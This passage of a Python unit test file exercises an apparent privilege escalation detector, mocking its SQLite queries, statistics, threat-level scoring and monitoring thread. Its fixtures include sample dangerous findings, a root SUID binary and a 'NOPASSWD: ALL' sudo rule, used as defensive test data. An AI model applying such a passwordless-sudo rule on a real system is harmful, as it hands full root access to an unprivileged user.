        mock_cursor.fetchall.return_value = [
            (
                1, "suid_binary", "/usr/bin/custom_binary", "added", 
                None, "Owner: root, Group: root, Permissions: 0o4755", 
                1234567890.0, 0
            ),
            (
                2, "sudo_config", "testuser@ALL", "added", 
                None, "NOPASSWD: ALL", 
                1234567890.0, 0
            )
        ]
        
        # Call the method
        changes = self.detector.get_recent_changes()
        
        # Validate
        self.assertEqual(len(changes), 2)
        self.assertEqual(changes[0]["id"], 1)
        self.assertEqual(changes[0]["vector_type"], "suid_binary")
        self.assertEqual(changes[0]["path"], "/usr/bin/custom_binary")
        self.assertEqual(changes[0]["change_type"], "added")
        self.assertEqual(changes[0]["new_value"], "Owner: root, Group: root, Permissions: 0o4755")
        self.assertFalse(changes[0]["verified"])
        
        self.assertEqual(changes[1]["id"], 2)
        self.assertEqual(changes[1]["vector_type"], "sudo_config")
        self.assertEqual(changes[1]["path"], "testuser@ALL")
        self.assertEqual(changes[1]["change_type"], "added")
        self.assertEqual(changes[1]["new_value"], "NOPASSWD: ALL")
        self.assertFalse(changes[1]["verified"])
        
        # Test with filters
        self.detector.get_recent_changes(limit=10, since=1234567800.0, include_verified=True)
        
        # Verify query has WHERE clause and parameters
        mock_cursor.execute.assert_called_with(
            "SELECT * FROM escalation_changes WHERE timestamp > ? ORDER BY timestamp DESC LIMIT ?",
            [1234567800.0, 10]
        )
    
    @patch('sqlite3.connect')
    def test_verify_change(self, mock_connect):
        """Test verify_change method"""
        # Setup mock connection and cursor
        mock_conn = MagicMock()
        mock_cursor = MagicMock()
        mock_connect.return_value = mock_conn
        mock_conn.cursor.return_value = mock_cursor
        
        # Call the method
        result = self.detector.verify_change(123)
        
        # Validate
        self.assertTrue(result)
        mock_cursor.execute.assert_called_with(
            "UPDATE escalation_changes SET verified = 1 WHERE id = ?", 
            (123,)
        )
        mock_conn.commit.assert_called_once()
    
    @patch('sqlite3.connect')
    def test_get_statistics(self, mock_connect):
        """Test get_statistics method"""
        # Setup mock connection and cursor
        mock_conn = MagicMock()
        mock_cursor = MagicMock()
        mock_connect.return_value = mock_conn
        mock_conn.cursor.return_value = mock_cursor
        
        # Set up mock data for each query result
        mock_cursor.fetchone.side_effect = [
            (10,),  # total_suid_binaries
            (2,),   # suspicious_suid_binaries
            (5,),   # total_sudo_configs
            (1,),   # dangerous_sudo_configs
            (3,),   # total_capabilities
            (1,),   # dangerous_capabilities
            (4,),   # total_cron_jobs
            (1,),   # suspicious_cron_jobs
            (2,),   # total_nfs_exports
            (1,),   # dangerous_nfs_exports
            (3,),   # writable_configs
            (2,),   # total_container_vectors
            (1,),   # dangerous_container_vectors
            (5,),   # recent_changes
        ]
        
        # Call the method
        stats = self.detector.get_statistics()
        
        # Validate
        self.assertEqual(stats["total_suid_binaries"], 10)
        self.assertEqual(stats["suspicious_suid_binaries"], 2)
        self.assertEqual(stats["total_sudo_configs"], 5)
        self.assertEqual(stats["dangerous_sudo_configs"], 1)
        self.assertEqual(stats["total_capabilities"], 3)
        self.assertEqual(stats["dangerous_capabilities"], 1)
        self.assertEqual(stats["total_cron_jobs"], 4)
        self.assertEqual(stats["suspicious_cron_jobs"], 1)
        self.assertEqual(stats["total_nfs_exports"], 2)
        self.assertEqual(stats["dangerous_nfs_exports"], 1)
        self.assertEqual(stats["writable_configs"], 3)
        self.assertEqual(stats["total_container_vectors"], 2)
        self.assertEqual(stats["dangerous_container_vectors"], 1)
        self.assertEqual(stats["recent_changes"], 5)
        
        # Calculated total suspicious vectors (sum of all suspicious/dangerous items)
        self.assertEqual(stats["total_suspicious_vectors"], 10)
        
        self.assertIn("last_updated", stats)
    
    @patch('modules.privilege_escalation.PrivilegeEscalationDetector.check_integrity')
    @patch('modules.privilege_escalation.PrivilegeEscalationDetector.get_suspicious_vectors')
    @patch('modules.privilege_escalation.PrivilegeEscalationDetector.get_statistics')
    def test_run_scan(self, mock_stats, mock_suspicious, mock_integrity):
        """Test run_scan method"""
        # Setup mocks
        mock_integrity.return_value = [
            {
                "vector_type": "suid_binary",
                "path": "/usr/bin/custom_binary",
                "change_type": "added",
                "is_suspicious": True,
                "timestamp": time.time()
            }
        ]
        
        mock_suspicious.return_value = {
            "suid_binaries": [
                {"path": "/usr/bin/custom_binary", "reason": "Recently added"}
            ],
            "sudo_configs": [],
            "capabilities": [],
            "cron_jobs": [],
            "nfs_exports": [],
            "writable_configs": [],
            "container_escapes": []
        }
        
        mock_stats.return_value = {
            "total_suspicious_vectors": 1,
            "last_updated": "2023-01-01 00:00:00"
        }
        
        # Call the method
        result = self.detector.run_scan()
        
        # Validate
        self.assertIn("timestamp", result)
        self.assertIn("scan_time_seconds", result)
        self.assertIn("total_changes", result)
        self.assertIn("threat_level", result)
        self.assertIn("suspicious_vectors", result)
        self.assertIn("statistics", result)
        self.assertIn("recent_changes", result)
        
        # Test threat level determination
        self.assertEqual(result["total_changes"], 1)
        self.assertEqual(result["threat_level"], "medium")  # 1 suspicious vector = medium
        
        # Test with more suspicious vectors
        mock_stats.return_value = {"total_suspicious_vectors": 6}
        result = self.detector.run_scan()
        self.assertEqual(result["threat_level"], "high")
        
        mock_stats.return_value = {"total_suspicious_vectors": 11}
        result = self.detector.run_scan()
        self.assertEqual(result["threat_level"], "critical")
        
        mock_stats.return_value = {"total_suspicious_vectors": 0}
        result = self.detector.run_scan()
        self.assertEqual(result["threat_level"], "low")
    
    @patch('time.sleep')
    @patch('threading.Thread')
    @patch('modules.privilege_escalation.PrivilegeEscalationDetector.run_scan')
    def test_start_monitoring(self, mock_run_scan, mock_thread, mock_sleep):
        """Test start_monitoring method"""
        # Setup mocks
        mock_run_scan.return_value = {
            "threat_level": "low",
            "total_changes": 0,
            "suspicious_vectors": {
                "suid_binaries": [],
                "sudo_configs": [],
                "capabilities": [],
                "cron_jobs": [],
                "nfs_exports": [],
                "writable_configs": [],
                "container_escapes": []
            },
            "recent_changes": []
        }
        
        # Call the method
        result = self.detector.start_monitoring(interval=10)
        
        # Validate
        self.assertTrue(result)
        mock_thread.assert_called_once()
        
        # Execute the monitoring function passed to Thread
        thread_target = mock_thread.call_args[1]['target']
        
        # This should call run_scan, then sleep
        thread_target()
        
        mock_run_scan.assert_called_once()
        mock_sleep.assert_called_with(10)

if __name__ == '__main__':
    unittest.main()